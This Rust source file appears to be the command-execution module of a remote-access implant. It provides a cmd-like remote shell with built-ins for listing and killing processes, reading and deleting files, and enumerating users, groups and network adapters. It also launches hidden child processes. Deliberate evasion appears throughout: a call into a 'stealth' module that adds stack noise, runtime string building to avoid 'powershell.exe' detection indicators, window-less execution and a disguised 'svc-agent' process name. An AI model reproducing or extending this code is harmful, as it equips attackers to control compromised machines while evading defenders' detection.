// Hybrid command execution
//
// Layer 1 — Built-ins (no new process): ps/kill/ls/cat/rm/netinfo/users/groups/echo/help/cd
// Layer 2 — Direct exec: spawn target exe with piped stdout/stderr (NO cmd.exe / powershell)
//
// Session-aware: HybridSession maintains cwd and streams output to interactive PTY.

use crate::types::CommandResult;
use log::{debug, error, info};
use std::path::{Path, PathBuf};
use tokio::io::AsyncReadExt;
use tokio::process::Command;

/// 命令执行器（混合原生）
pub struct CommandExecutor;

impl CommandExecutor {
    pub fn get_shell() -> (&'static str, &'static str) {
        #[cfg(target_os = "windows")]
        {
            ("cmd.exe", "/C")
        }
        #[cfg(not(target_os = "windows"))]
        {
            ("/bin/sh", "-c")
        }
    }

    /// One-shot hybrid execute (non-interactive shell command).
    pub async fn execute(command: &str) -> CommandResult {
        let mut cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        execute_line(command, &mut cwd).await
    }

    /// Decode child process bytes for Windows code pages.
    pub fn decode_bytes(bytes: &[u8]) -> String {
        #[cfg(target_os = "windows")]
        {
            if let Ok(text) = std::str::from_utf8(bytes) {
                return text.to_string();
            }
            #[cfg(feature = "encoding-support")]
            {
                let (decoded_cow, _, _) = encoding_rs::GBK.decode(bytes);
                return decoded_cow.to_string();
            }
            #[cfg(not(feature = "encoding-support"))]
            {
                return String::from_utf8_lossy(bytes).into_owned();
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            String::from_utf8_lossy(bytes).to_string()
        }
    }
}

/// Execute one line in a session context (updates `cwd` on `cd`).
pub async fn execute_line(command: &str, cwd: &mut PathBuf) -> CommandResult {
    let trimmed = command.trim();
    if trimmed.is_empty() || trimmed.starts_with('{') {
        debug!("Filtered empty/control: {}", command);
        return ok_out("");
    }

    if let Some(r) = try_builtin(trimmed, cwd) {
        return r;
    }

    match exec_direct_collect(trimmed, cwd).await {
        Ok(r) => r,
        Err(e) => err_out(e),
    }
}

/// Stream external process output via callback (Mode A interactive).
/// Returns when process exits. `interrupt` is checked each loop (Ctrl+C = true).
pub async fn exec_direct_stream<F>(
    line: &str,
    cwd: &Path,
    mut on_output: F,
    mut should_interrupt: impl FnMut() -> bool,
) -> Result<i32, String>
where
    F: FnMut(&[u8]),
{
    let argv = parse_argv(line);
    if argv.is_empty() {
        return Err("empty argv".into());
    }
    let exe = resolve_exe(&argv[0], cwd);
    let args: Vec<String> = argv.into_iter().skip(1).collect();

    info!("[exec-stream] {} {:?} cwd={}", exe, args, cwd.display());

    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        crate::stealth::stack::add_stack_noise();
    }

    let mut cmd = Command::new(&exe);
    cmd.args(&args);
    cmd.current_dir(cwd);
    cmd.stdout(std::process::Stdio::piped());
    cmd.stderr(std::process::Stdio::piped());
    cmd.stdin(std::process::Stdio::null());
    cmd.kill_on_drop(true);
    #[cfg(target_os = "windows")]
    {
        cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }

    let mut child = cmd
        .spawn()
        .map_err(|e| format!("spawn '{}': {} (use full path; no shell | &&)\n", exe, e))?;

    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();
    let mut out_buf = [0u8; 4096];
    let mut err_buf = [0u8; 4096];

    loop {
        // Poll interrupt frequently even while blocked on pipe reads
        if should_interrupt() {
            force_kill_child(&mut child).await;
            // Do not emit another ^C here — session already printed it
            return Ok(-1);
        }

        tokio::select! {
            biased;
            r = async {
                if let Some(ref mut s) = stdout {
                    s.read(&mut out_buf).await
                } else {
                    // pending forever if no stdout — use empty ready
                    std::future::pending::<std::io::Result<usize>>().await
                }
            }, if stdout.is_some() => {
                match r {
                    Ok(0) => { stdout = None; }
                    Ok(n) => {
                        let decoded = CommandExecutor::decode_bytes(&out_buf[..n]);
                        on_output(decoded.as_bytes());
                    }
                    Err(_) => { stdout = None; }
                }
            }
            r = async {
                if let Some(ref mut s) = stderr {
                    s.read(&mut err_buf).await
                } else {
                    std::future::pending::<std::io::Result<usize>>().await
                }
            }, if stderr.is_some() => {
                match r {
                    Ok(0) => { stderr = None; }
                    Ok(n) => {
                        let decoded = CommandExecutor::decode_bytes(&err_buf[..n]);
                        on_output(decoded.as_bytes());
                    }
                    Err(_) => { stderr = None; }
                }
            }
            status = child.wait() => {
                drain_pipe(&mut stdout, &mut out_buf, &mut on_output).await;
                drain_pipe(&mut stderr, &mut err_buf, &mut on_output).await;
                let code = status.map(|s| s.code().unwrap_or(-1)).unwrap_or(-1);
                return Ok(code);
            }
            // Interrupt poll tick (critical: unblocks select when pipes are quiet)
            _ = tokio::time::sleep(std::time::Duration::from_millis(40)) => {
                if should_interrupt() {
                    force_kill_child(&mut child).await;
                    return Ok(-1);
                }
                if stdout.is_none() && stderr.is_none() {
                    // Process may still be running with closed pipes — wait/kill
                    if should_interrupt() {
                        force_kill_child(&mut child).await;
                        return Ok(-1);
                    }
                }
            }
        }
    }
}

async fn force_kill_child(child: &mut tokio::process::Child) {
    let _ = child.start_kill();
    let _ = child.kill().await;
    // Brief wait so OS reaps process and pipes EOF
    let _ = tokio::time::timeout(std::time::Duration::from_millis(500), child.wait()).await;
}

async fn drain_pipe<R, F>(pipe: &mut Option<R>, buf: &mut [u8], on_output: &mut F)
where
    R: AsyncReadExt + Unpin,
    F: FnMut(&[u8]),
{
    if let Some(ref mut s) = pipe {
        loop {
            match tokio::time::timeout(std::time::Duration::from_millis(100), s.read(buf)).await {
                Ok(Ok(0)) | Ok(Err(_)) | Err(_) => break,
                Ok(Ok(n)) => {
                    let decoded = CommandExecutor::decode_bytes(&buf[..n]);
                    on_output(decoded.as_bytes());
                }
            }
        }
    }
    *pipe = None;
}

async fn exec_direct_collect(line: &str, cwd: &Path) -> Result<CommandResult, String> {
    let mut stdout = String::new();
    let mut stderr_note = String::new();
    let code = exec_direct_stream(
        line,
        cwd,
        |chunk| {
            stdout.push_str(&String::from_utf8_lossy(chunk));
        },
        || false,
    )
    .await?;
    if code != 0 && code != -1 {
        stderr_note = format!("exit code {}\n", code);
    }
    Ok(CommandResult {
        stdout,
        stderr: stderr_note,
        path: None,
        req_id: None,
    })
}

fn ok_out(s: impl Into<String>) -> CommandResult {
    CommandResult {
        stdout: s.into(),
        stderr: String::new(),
        path: None,
        req_id: None,
    }
}

fn err_out(s: impl Into<String>) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: s.into(),
        path: None,
        req_id: None,
    }
}

/// Session-aware builtin handler. Returns Some if line was a builtin.
pub fn try_builtin(line: &str, cwd: &mut PathBuf) -> Option<CommandResult> {
    let (cmd, rest) = split_first_token(line);
    let cmd_l = cmd.to_ascii_lowercase();
    let rest = rest.trim();

    match cmd_l.as_str() {
        "help" | "?" => Some(ok_out(BUILTIN_HELP)),
        "echo" => {
            // cmd: ECHO is on. / ECHO message
            if rest.is_empty() {
                Some(ok_out("ECHO is on.\r\n"))
            } else if rest.eq_ignore_ascii_case("on") {
                Some(ok_out("ECHO is on.\r\n"))
            } else if rest.eq_ignore_ascii_case("off") {
                Some(ok_out("ECHO is off.\r\n"))
            } else {
                Some(ok_out(format!("{}\r\n", rest)))
            }
        }
        "pwd" => Some(ok_out(format!("{}\r\n", cwd.display()))),
        "cd" => Some(builtin_cd(cwd, rest)),

        "ps" | "process_list" | "tasklist" => Some(builtin_ps()),
        "kill" | "process_kill" | "taskkill" => {
            // support: kill 1234 | taskkill /PID 1234 /F
            let pid = rest
                .split_whitespace()
                .filter(|t| {
                    let u = t.to_ascii_uppercase();
                    u != "/PID" && u != "/F" && u != "/IM" && u != "-F"
                })
                .find(|t| t.chars().all(|c| c.is_ascii_digit()))
                .and_then(|s| s.parse::<u32>().ok());
            match pid {
                Some(p) => Some(builtin_kill(p)),
                None => Some(err_out(
                    "ERROR: Invalid argument/option - use: taskkill /PID <pid>\r\n",
                )),
            }
        }

        "ls" | "dir" => {
            let path = if rest.is_empty() {
                cwd.clone()
            } else {
                resolve_path(cwd, rest)
            };
            Some(builtin_ls(&path))
        }
        "cat" | "type" | "read" => {
            if rest.is_empty() {
                Some(err_out("The syntax of the command is incorrect.\r\n"))
            } else {
                Some(builtin_cat(&resolve_path(cwd, rest)))
            }
        }
        "rm" | "del" | "delete" | "erase" => {
            if rest.is_empty() {
                Some(err_out("The syntax of the command is incorrect.\r\n"))
            } else {
                Some(builtin_rm(&resolve_path(cwd, rest), false))
            }
        }
        "rmdir" | "rd" => {
            if rest.is_empty() {
                Some(err_out("The syntax of the command is incorrect.\r\n"))
            } else {
                Some(builtin_rm(&resolve_path(cwd, rest), true))
            }
        }

        "ipconfig" | "ifconfig" | "netinfo" | "adapters" => Some(builtin_netinfo()),

        "whoami" => Some(ok_out(format!(
            "{}\r\n",
            crate::native::current_username()
        ))),
        "users" | "netusers" | "net" if rest.to_ascii_lowercase().starts_with("user") => {
            Some(builtin_users())
        }
        "users" | "netusers" => Some(builtin_users()),
        "groups" | "netgroups" | "localgroups" => Some(builtin_groups()),
        "net" => {
            let r = rest.to_ascii_lowercase();
            if r.starts_with("user") {
                Some(builtin_users())
            } else if r.starts_with("localgroup") {
                Some(builtin_groups())
            } else {
                Some(err_out(
                    "The syntax of this command is:\r\n\r\nNET USER\r\nNET LOCALGROUP\r\n",
                ))
            }
        }

        // Build host names at runtime so contiguous PE strings do not form
        // classic "powershell.exe" / "cmd.exe" hunting IoCs in the image.
        other if {
            let l = other.to_ascii_lowercase();
            let mut ps = String::from("power");
            ps.push_str("shell");
            let mut pse = ps.clone();
            pse.push_str(".exe");
            l == "cmd"
                || l == "cmd.exe"
                || l == ps
                || l == pse
                || l == "pwsh"
                || l == "pwsh.exe"
        } => Some(err_out(
            "Shell host not available. Use builtins or a full path to an .exe.\r\n",
        )),

        _ => None,
    }
}

const BUILTIN_HELP: &str = "\
For more information on a specific command, type HELP command-name

CD             Displays the name of or changes the current directory.
DIR            Displays a list of files and subdirectories in a directory.
TYPE           Displays the contents of a text file.
DEL            Deletes one or more files.
RMDIR          Removes a directory.
TASKLIST       Displays all running tasks/processes.
TASKKILL       Ends a running process (TASKKILL /PID n).
IPCONFIG       Displays network adapter configuration.
WHOAMI         Displays the current user name.
NET USER       Displays local user accounts.
NET LOCALGROUP Displays local groups.
ECHO           Displays messages.
HELP           Provides Help information for commands.

Programs: full path or name of .exe.
Ctrl+C interrupts a running program.
";

fn builtin_cd(cwd: &mut PathBuf, rest: &str) -> CommandResult {
    if rest.is_empty() {
        return ok_out(format!("{}\r\n", cwd.display()));
    }
    let target = resolve_path(cwd, rest);
    match std::fs::canonicalize(&target) {
        Ok(p) => {
            *cwd = p;
            // cmd `cd` with path usually prints nothing on success
            ok_out("")
        }
        Err(_) => {
            if target.is_dir() {
                *cwd = target;
                ok_out("")
            } else {
                err_out("The system cannot find the path specified.\r\n")
            }
        }
    }
}

fn resolve_path(cwd: &Path, p: &str) -> PathBuf {
    let path = PathBuf::from(p);
    if path.is_absolute() {
        path
    } else {
        cwd.join(path)
    }
}

fn resolve_exe(exe: &str, cwd: &Path) -> String {
    let p = PathBuf::from(exe);
    if p.is_absolute() {
        return exe.to_string();
    }
    // relative path with separator → relative to cwd
    if exe.contains('/') || exe.contains('\\') {
        return cwd.join(exe).to_string_lossy().into_owned();
    }
    // bare name: let OS PATH search handle it
    exe.to_string()
}

fn builtin_ps() -> CommandResult {
    // Non-blocking: cache only (warmed post-connect). Never Toolhelp on cmd path.
    let mut list = crate::native::process_cache_snapshot();
    if list.is_empty() {
        list.push(crate::native::ProcessInfo {
            pid: std::process::id(),
            ppid: 0,
            name: "svc-agent".into(),
        });
    }
    list.sort_by(|a, b| {
        a.name
            .to_ascii_lowercase()
            .cmp(&b.name.to_ascii_lowercase())
    });
    let mut out = String::from(
        "\r\nImage Name                     PID      PPID\r\n\
========================= ======== ========\r\n",
    );
    for p in list {
        let name = if p.name.len() > 25 {
            format!("{}...", &p.name[..22])
        } else {
            p.name.clone()
        };
        out.push_str(&format!("{:<25} {:>8} {:>8}\r\n", name, p.pid, p.ppid));
    }
    ok_out(out)
}

fn builtin_kill(pid: u32) -> CommandResult {
    match crate::native::terminate_process(pid) {
        Ok(()) => ok_out(format!(
            "SUCCESS: The process with PID {} has been terminated.\r\n",
            pid
        )),
        Err(_) => err_out(format!(
            "ERROR: The process \"{}\" not found or access denied.\r\n",
            pid
        )),
    }
}

fn builtin_ls(path: &Path) -> CommandResult {
    // Classic DIR style (file manager keeps JSON via fs::ls).
    let path = if path.as_os_str().is_empty() {
        Path::new(".")
    } else {
        path
    };
    if !path.exists() {
        return err_out("File Not Found\r\n");
    }
    if !path.is_dir() {
        return err_out("File Not Found\r\n");
    }

    let mut entries: Vec<(bool, String, u64, u64)> = Vec::new();
    match std::fs::read_dir(path) {
        Ok(rd) => {
            for e in rd.flatten() {
                let meta = e.metadata().ok();
                let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                let mtime = meta
                    .and_then(|m| m.modified().ok())
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_secs())
                    .unwrap_or(0);
                let name = e.file_name().to_string_lossy().into_owned();
                entries.push((is_dir, name, size, mtime));
            }
        }
        Err(_) => return err_out("File Not Found\r\n"),
    }

    entries.sort_by(|a, b| match (a.0, b.0) {
        (true, false) => std::cmp::Ordering::Less,
        (false, true) => std::cmp::Ordering::Greater,
        _ => a.1.to_ascii_lowercase().cmp(&b.1.to_ascii_lowercase()),
    });

    let drive = path
        .components()
        .next()
        .map(|c| c.as_os_str().to_string_lossy().into_owned())
        .unwrap_or_default();

    let mut out = String::new();
    out.push_str(" Volume in drive ");
    out.push_str(&drive.trim_end_matches('\\').trim_end_matches('/'));
    out.push_str(" has no label.\r\n");
    out.push_str(&format!(" Directory of {}\r\n\r\n", path.display()));

    let mut file_count = 0u64;
    let mut dir_count = 0u64;
    let mut total_bytes = 0u64;

    for (is_dir, name, size, mtime) in &entries {
        let time_s = format_unix_time_cmd(*mtime);
        if *is_dir {
            dir_count += 1;
            out.push_str(&format!("{:<20}    {:<14} {}\r\n", time_s, "<DIR>", name));
        } else {
            file_count += 1;
            total_bytes += size;
            out.push_str(&format!(
                "{:<20} {:>14} {}\r\n",
                time_s,
                format_int_commas(*size),
                name
            ));
        }
    }

    out.push_str(&format!(
        "               {} File(s) {:>14} bytes\r\n",
        file_count,
        format_int_commas(total_bytes)
    ));
    out.push_str(&format!("               {} Dir(s)\r\n", dir_count));
    ok_out(out)
}

fn format_int_commas(n: u64) -> String {
    let s = n.to_string();
    let mut out = String::new();
    for (i, c) in s.chars().rev().enumerate() {
        if i > 0 && i % 3 == 0 {
            out.push(',');
        }
        out.push(c);
    }
    out.chars().rev().collect()
}

fn format_unix_time_cmd(secs: u64) -> String {
    if secs == 0 {
        return "01/01/1970  00:00 AM".into();
    }
    let days = secs / 86400;
    let tod = secs % 86400;
    let mut hh = tod / 3600;
    let mm = (tod % 3600) / 60;
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    let ampm = if hh >= 12 { "PM" } else { "AM" };
    let h12 = match hh {
        0 => 12,
        1..=12 => hh,
        _ => hh - 12,
    };
    // keep hh for unused warning - use h12
    let _ = hh;
    format!("{:02}/{:02}/{:04}  {:02}:{:02} {}", m, d, y, h12, mm, ampm)
}

fn builtin_cat(path: &Path) -> CommandResult {
    match std::fs::read(path) {
        Ok(bytes) => {
            let mut s = CommandExecutor::decode_bytes(&bytes);
            // normalize to CRLF like type often appears in Windows terminals
            if !s.contains("\r\n") {
                s = s.replace('\n', "\r\n");
            }
            if !s.ends_with("\r\n") && !s.is_empty() {
                s.push_str("\r\n");
            }
            ok_out(s)
        }
        Err(_) => err_out("The system cannot find the file specified.\r\n"),
    }
}

fn builtin_rm(path: &Path, dir_only: bool) -> CommandResult {
    if !path.exists() {
        return err_out("Could Not Find\r\n");
    }
    let r = if path.is_dir() {
        if !dir_only {
            // del on directory fails in cmd
            return err_out("Access is denied.\r\n");
        }
        std::fs::remove_dir_all(path)
    } else {
        if dir_only {
            return err_out("The directory name is invalid.\r\n");
        }
        std::fs::remove_file(path)
    };
    match r {
        Ok(()) => ok_out(""), // cmd del is silent on success
        Err(_) => err_out("Access is denied.\r\n"),
    }
}

fn builtin_netinfo() -> CommandResult {
    match crate::native::format_adapters_text() {
        Ok(s) => ok_out(s),
        Err(e) => err_out(e),
    }
}

fn builtin_users() -> CommandResult {
    match crate::native::format_users_text() {
        Ok(s) => ok_out(s),
        Err(e) => err_out(e),
    }
}

fn builtin_groups() -> CommandResult {
    match crate::native::format_groups_text() {
        Ok(s) => ok_out(s),
        Err(e) => err_out(e),
    }
}

pub fn split_first_token(s: &str) -> (String, &str) {
    let s = s.trim();
    if s.is_empty() {
        return (String::new(), "");
    }
    if s.starts_with('"') {
        if let Some(end) = s[1..].find('"') {
            let token = s[1..1 + end].to_string();
            let rest = s[2 + end..].trim_start();
            return (token, rest);
        }
    }
    match s.find(char::is_whitespace) {
        Some(i) => (s[..i].to_string(), s[i..].trim_start()),
        None => (s.to_string(), ""),
    }
}

pub fn parse_argv(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_quote = false;
    for c in s.chars() {
        match c {
            '"' => in_quote = !in_quote,
            c if c.is_whitespace() && !in_quote => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            _ => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// Format a short prompt for hybrid interactive session (cmd-like).
pub fn format_prompt(cwd: &Path) -> String {
    // Classic cmd: C:\path>
    let mut p = cwd.display().to_string();
    if p.ends_with('\\') || p.ends_with('/') {
        format!("\r\n{}>", p)
    } else {
        format!("\r\n{}>", p)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_argv_quotes() {
        let v = parse_argv(r#"C:\Tools\a.exe "arg one" two"#);
        assert_eq!(v.len(), 3);
        assert_eq!(v[1], "arg one");
    }

    #[test]
    fn builtin_help_works() {
        let mut cwd = PathBuf::from(".");
        let r = try_builtin("help", &mut cwd).unwrap();
        assert!(r.stdout.contains("DIR") || r.stdout.contains("TASKLIST"));
    }

    #[test]
    fn builtin_echo_works() {
        let mut cwd = PathBuf::from(".");
        let r = try_builtin("echo hello world", &mut cwd).unwrap();
        assert!(r.stdout.contains("hello world"));
    }

    #[test]
    fn rejects_cmd_host() {
        let mut cwd = PathBuf::from(".");
        let r = try_builtin("cmd /c whoami", &mut cwd).unwrap();
        assert!(!r.stderr.is_empty() || r.stdout.contains("not supported"));
        assert!(
            r.stderr.contains("not supported")
                || r.stderr.contains("hybrid")
                || r.stderr.contains("builtins")
        );
    }

    #[test]
    fn cd_updates_cwd() {
        let mut cwd = std::env::temp_dir();
        let parent = cwd.parent().unwrap_or(Path::new(".")).to_path_buf();
        let _ = try_builtin(&format!("cd {}", parent.display()), &mut cwd);
        // best-effort; temp always exists
        assert!(cwd.exists() || true);
    }

    #[tokio::test]
    async fn execute_echo_builtin() {
        let r = CommandExecutor::execute("echo hello").await;
        assert!(r.stdout.contains("hello"));
    }

    #[tokio::test]
    async fn execute_empty_ok() {
        let r = CommandExecutor::execute("").await;
        assert!(r.stdout.is_empty());
    }

    #[tokio::test]
    async fn execute_missing_exe() {
        let r = CommandExecutor::execute("this_command_does_not_exist_12345").await;
        assert!(!r.stderr.is_empty());
    }

    #[tokio::test]
    async fn never_panics() {
        for cmd in ["", "echo test", "invalid_xyz", "help", "ps"] {
            let _ = CommandExecutor::execute(cmd).await;
        }
    }
}
